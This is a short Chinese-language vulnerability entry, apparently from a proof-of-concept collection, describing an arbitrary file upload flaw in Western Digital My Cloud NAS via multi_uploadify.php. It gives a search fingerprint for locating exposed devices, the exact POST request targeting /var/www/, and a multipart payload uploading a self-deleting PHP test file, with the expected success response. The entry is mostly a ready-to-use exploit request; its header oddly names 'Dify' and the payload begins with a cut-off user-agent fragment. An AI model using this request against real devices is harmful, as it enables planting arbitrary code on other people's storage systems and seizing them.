# WesternDigitalMyCloudNASmulti_uploadify存在任意文件上传漏洞

Dify ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="-1074357885"`
- **请求**：`POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata[]"; filename="test123.php"
Content-Type: application/octet-stream
<?php echo 'test123'; unlink(__FILE__); ?>
------WebKitFormBoundary--
```
- **响应特征**：200 上传位置/test123.php